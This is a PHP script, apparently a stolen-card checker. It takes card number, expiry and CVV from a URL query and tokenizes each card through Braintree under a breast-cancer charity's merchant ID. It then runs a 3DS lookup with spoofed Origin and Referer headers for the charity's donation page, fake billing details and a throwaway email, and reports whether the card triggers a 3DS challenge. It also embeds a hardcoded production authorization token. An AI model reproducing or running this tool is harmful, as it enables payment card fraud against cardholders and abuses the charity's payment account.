<?php
// api.php - Braintree 3DS Lookup API with Dynamic Token Management
// Usage: http://localhost/3dd/api.php?query=4038390050500282|07|2027|808

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Configuration
define('TOKEN_FILE', __DIR__ . '/token_cache.json');
define('MERCHANT_ID', 'n47mkdj4n22qjcyq');
define('BRAINTREE_VERSION', '2018-05-10');

// Function to get or refresh authorization fingerprint
function getAuthorizationFingerprint() {
    $tokenData = loadTokenFromCache();
    
    // Check if token exists and is still valid (not expired)
    if ($tokenData && isset($tokenData['fingerprint']) && isset($tokenData['expires_at'])) {
        $currentTime = time();
        // Add 5 minutes buffer to be safe
        if ($currentTime < ($tokenData['expires_at'] - 300)) {
            return $tokenData['fingerprint'];
        }
    }
    
    // Token expired or doesn't exist, generate new one
    return refreshAuthorizationFingerprint();
}

// Load token from cache file
function loadTokenFromCache() {
    if (file_exists(TOKEN_FILE)) {
        $content = file_get_contents(TOKEN_FILE);
        return json_decode($content, true);
    }
    return null;
}

// Save token to cache file
function saveTokenToCache($fingerprint, $expiresAt) {
    $tokenData = [
        'fingerprint' => $fingerprint,
        'expires_at' => $expiresAt,
        'created_at' => time()
    ];
    file_put_contents(TOKEN_FILE, json_encode($tokenData, JSON_PRETTY_PRINT));
}

// Generate new authorization fingerprint via client token API
function refreshAuthorizationFingerprint() {
    $clientTokenUrl = 'https://api.braintreegateway.com/merchants/' . MERCHANT_ID . '/client_api/v1/client_tokens';
    
    // First, get a new client token
    $ch = curl_init($clientTokenUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'clientToken' => [
            'version' => 2
        ]
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Braintree-Version: ' . BRAINTREE_VERSION,
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode !== 200) {
        // Fallback to static token if client token generation fails
        error_log("Failed to generate client token, using static fallback. HTTP Code: " . $httpCode);
        return getStaticFallbackToken();
    }
    
    $data = json_decode($response, true);
    
    if (!$data || !isset($data['clientToken'])) {
        error_log("Invalid client token response: " . $response);
        return getStaticFallbackToken();
    }
    
    $clientToken = $data['clientToken'];
    
    // Now exchange client token for authorization fingerprint
    // The client token itself is the JWT that can be used as authorization fingerprint
    // Extract expiration from JWT
    $expiresAt = extractExpiryFromJWT($clientToken);
    
    // Save to cache
    saveTokenToCache($clientToken, $expiresAt);
    
    return $clientToken;
}

// Extract expiration timestamp from JWT token
function extractExpiryFromJWT($jwt) {
    $parts = explode('.', $jwt);
    if (count($parts) === 3) {
        $payload = json_decode(base64_decode($parts[1]), true);
        if (isset($payload['exp'])) {
            return $payload['exp'];
        }
    }
    // Default expiration: 1 hour from now
    return time() + 3600;
}

// Static fallback token (updated from your original)
function getStaticFallbackToken() {
    // This is your original token - will be used if dynamic generation fails
    return "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3ODE1MzU5OTgsImp0aSI6IjhhY2ZjZGJlLTQ0MTAtNDIwMS05ZTZhLTA4MGJmNTg3MzM2NCIsInN1YiI6Im40N21rZGo0bjIycWpjeXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im40N21rZGo0bjIycWpjeXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImJyZWFzdGNhbmNlcm5vd0dCUF9nb2RvbmF0ZTIiLCJwYXlwYWxfY2xpZW50X2lkIjoiQWZRQXR0MEF4eFNYOEhuMG42aTVrZXc1aEJwZDhDYTFjcDdVay0wTkNOME9EOFg5R3NfWUhTa1hFWU9SajB2OXNGcEFxM1ltODI3QVFUU3IifX0.0WUq_sO8MWagDDylW-u-Cxzh2CBkFNENSfOCgltYdk5Vfk5YI0F_PHs6t05IwjF_XUrgFEdyZ1kyDPvoTv8xDg";
}

// Function to validate and parse card details
function parseCardDetails($queryString) {
    $parts = explode('|', $queryString);
    
    if (count($parts) !== 4) {
        return false;
    }
    
    return [
        'number' => trim($parts[0]),
        'expirationMonth' => str_pad(trim($parts[1]), 2, '0', STR_PAD_LEFT),
        'expirationYear' => trim($parts[2]),
        'cvv' => trim($parts[3])
    ];
}

// Function to perform tokenization and get 3DS status
function get3DSStatus($cardDetails) {
    $graphqlUrl = 'https://payments.braintree-api.com/graphql';
    $merchantId = MERCHANT_ID;
    
    // Get fresh authorization fingerprint (auto-refreshes if expired)
    $authorizationFingerprint = getAuthorizationFingerprint();
    
    // GraphQL query for tokenization
    $graphqlQuery = 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin last4 cardholderName expirationMonth expirationYear } } }';
    
    $tokenizationPayload = [
        "clientSdkMetadata" => [
            "source" => "client",
            "integration" => "custom",
            "sessionId" => generateSessionId()
        ],
        "query" => $graphqlQuery,
        "variables" => [
            "input" => [
                "creditCard" => [
                    "number" => $cardDetails['number'],
                    "expirationMonth" => $cardDetails['expirationMonth'],
                    "expirationYear" => $cardDetails['expirationYear'],
                    "cvv" => $cardDetails['cvv']
                ],
                "options" => ["validate" => false]
            ]
        ],
        "operationName" => "TokenizeCreditCard"
    ];
    
    // Step 1: Tokenize the credit card
    $ch = curl_init($graphqlUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($tokenizationPayload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Authorization: Bearer ' . $authorizationFingerprint,
        'Braintree-Version: ' . BRAINTREE_VERSION,
        'Content-Type: application/json',
        'Origin: https://assets.braintreegateway.com',
        'Referer: https://assets.braintreegateway.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    
    $tokenizationResponse = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode !== 200) {
        // If tokenization fails with auth error, force token refresh and retry
        if ($httpCode === 401 || $httpCode === 403) {
            // Clear expired token and retry once
            clearTokenCache();
            $authorizationFingerprint = getAuthorizationFingerprint(); // This will generate new token
            
            // Retry tokenization with new token
            $tokenizationPayload['clientSdkMetadata']['authorizationFingerprint'] = $authorizationFingerprint;
            $ch = curl_init($graphqlUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($tokenizationPayload));
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Accept: application/json',
                'Authorization: Bearer ' . $authorizationFingerprint,
                'Braintree-Version: ' . BRAINTREE_VERSION,
                'Content-Type: application/json',
                'Origin: https://assets.braintreegateway.com',
                'Referer: https://assets.braintreegateway.com/',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_ENCODING, '');
            
            $tokenizationResponse = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
        }
        
        if ($httpCode !== 200) {
            return ['error' => 'Tokenization failed', 'http_code' => $httpCode];
        }
    }
    
    $tokenizationData = json_decode($tokenizationResponse, true);
    
    if (isset($tokenizationData['errors'])) {
        return ['error' => 'GraphQL error', 'message' => $tokenizationData['errors'][0]['message'] ?? 'Unknown error'];
    }
    
    // Extract payment method token
    $paymentMethodToken = $tokenizationData['data']['tokenizeCreditCard']['token'] ?? null;
    
    if (!$paymentMethodToken) {
        return ['error' => 'Failed to get payment token'];
    }
    
    // Step 2: Perform 3DS lookup
    $threeDSUrl = "https://api.braintreegateway.com/merchants/{$merchantId}/client_api/v1/payment_methods/{$paymentMethodToken}/three_d_secure/lookup";
    
    $threeDSPayload = [
        "amount" => 10,
        "browserColorDepth" => 32,
        "browserJavaEnabled" => false,
        "browserJavascriptEnabled" => true,
        "browserLanguage" => "en-US",
        "browserScreenHeight" => 864,
        "browserScreenWidth" => 1536,
        "browserTimeZone" => -330,
        "deviceChannel" => "Browser",
        "additionalInfo" => [
            "billingLine1" => "12 London Road",
            "billingLine2" => "",
            "billingCity" => "Westerham",
            "billingPostalCode" => "TN16 1BD",
            "billingCountryCode" => "gb",
            "billingGivenName" => "Henryk",
            "billingSurname" => "Henning",
            "email" => "tconfessiono720@yopmail.com"
        ],
        "bin" => substr($cardDetails['number'], 0, 6),
        "dfReferenceId" => "0_d116b900-e909-4ebd-9bc5-485457acefe3",
        "clientMetadata" => [
            "requestedThreeDSecureVersion" => "2",
            "sdkVersion" => "web/3.104.0",
            "cardinalDeviceDataCollectionTimeElapsed" => 191,
            "issuerDeviceDataCollectionTimeElapsed" => 3733,
            "issuerDeviceDataCollectionResult" => true
        ],
        "authorizationFingerprint" => $authorizationFingerprint,
        "braintreeLibraryVersion" => "braintree/web/3.104.0",
        "_meta" => [
            "merchantAppId" => "securepay.breastcancernow.org",
            "platform" => "web",
            "sdkVersion" => "3.104.0",
            "source" => "client",
            "integration" => "custom",
            "integrationType" => "custom",
            "sessionId" => generateSessionId()
        ]
    ];
    
    $ch = curl_init($threeDSUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($threeDSPayload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Authorization: Bearer ' . $authorizationFingerprint,
        'Braintree-Version: ' . BRAINTREE_VERSION,
        'Content-Type: application/json',
        'Origin: https://securepay.breastcancernow.org',
        'Referer: https://securepay.breastcancernow.org/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    
    $threeDSResponse = curl_exec($ch);
    curl_close($ch);
    
    // Parse the response to extract just the status
    $threeDSData = json_decode($threeDSResponse, true);
    
    // Extract status from the response
    $status = null;
    
    if (isset($threeDSData['threeDSecureInfo']['status'])) {
        $status = $threeDSData['threeDSecureInfo']['status'];
    } elseif (isset($threeDSData['lookup']['threeDSecureInfo']['status'])) {
        $status = $threeDSData['lookup']['threeDSecureInfo']['status'];
    } elseif (isset($threeDSData['paymentMethod']['threeDSecureInfo']['status'])) {
        $status = $threeDSData['paymentMethod']['threeDSecureInfo']['status'];
    } elseif (isset($threeDSData['status'])) {
        $status = $threeDSData['status'];
    }
    
    if ($status) {
        if ($status === 'challenge_required') {
            return [
                'success' => true,
                'status' => 'challenge_required',
                '3ds_supported' => true
            ];
        } elseif ($status === 'authenticate_successful') {
            return [
                'success' => true,
                'status' => 'authenticate_successful',
                '3ds_supported' => false
            ];
        } else {
            return [
                'success' => true,
                'status' => $status,
                '3ds_supported' => true
            ];
        }
    }
    
    return [
        'success' => false,
        'error' => 'Could not extract 3DS status from response'
    ];
}

// Helper function to generate unique session ID
function generateSessionId() {
    return sprintf('%s-%s-%s-%s-%s',
        bin2hex(random_bytes(4)),
        bin2hex(random_bytes(2)),
        bin2hex(random_bytes(2)),
        bin2hex(random_bytes(2)),
        bin2hex(random_bytes(6))
    );
}

// Clear token cache (force refresh on next request)
function clearTokenCache() {
    if (file_exists(TOKEN_FILE)) {
        unlink(TOKEN_FILE);
    }
}

// Optional: Endpoint to manually clear/refresh token
if (isset($_GET['refresh_token']) && $_GET['refresh_token'] === 'true') {
    clearTokenCache();
    $newToken = refreshAuthorizationFingerprint();
    echo json_encode([
        'success' => true,
        'message' => 'Token refreshed successfully',
        'token_preview' => substr($newToken, 0, 50) . '...'
    ], JSON_PRETTY_PRINT);
    exit();
}

// Main execution
$query = isset($_GET['query']) ? $_GET['query'] : (isset($_GET['q']) ? $_GET['q'] : null);

if (!$query) {
    echo json_encode([
        'success' => false,
        'error' => 'Missing query parameter',
        'usage' => 'http://localhost/3dd/api.php?query=4038390050500282|07|2027|808',
        'token_management' => 'Token auto-refreshes when expired. Use ?refresh_token=true to manually refresh'
    ], JSON_PRETTY_PRINT);
    exit();
}

// Parse card details
$cardDetails = parseCardDetails($query);

if (!$cardDetails) {
    echo json_encode([
        'success' => false,
        'error' => 'Invalid query format. Use: card_number|month|year|cvv'
    ], JSON_PRETTY_PRINT);
    exit();
}

// Validate card details
if (!preg_match('/^\d{13,19}$/', $cardDetails['number'])) {
    echo json_encode(['success' => false, 'error' => 'Invalid card number'], JSON_PRETTY_PRINT);
    exit();
}

if (!preg_match('/^\d{2}$/', $cardDetails['expirationMonth']) || $cardDetails['expirationMonth'] < 1 || $cardDetails['expirationMonth'] > 12) {
    echo json_encode(['success' => false, 'error' => 'Invalid expiration month (01-12)'], JSON_PRETTY_PRINT);
    exit();
}

if (!preg_match('/^\d{4}$/', $cardDetails['expirationYear'])) {
    echo json_encode(['success' => false, 'error' => 'Invalid expiration year (YYYY)'], JSON_PRETTY_PRINT);
    exit();
}

if (!preg_match('/^\d{3,4}$/', $cardDetails['cvv'])) {
    echo json_encode(['success' => false, 'error' => 'Invalid CVV'], JSON_PRETTY_PRINT);
    exit();
}

// Get 3DS status (auto-refreshes token if needed)
$result = get3DSStatus($cardDetails);

// Output result
echo json_encode($result, JSON_PRETTY_PRINT);
?>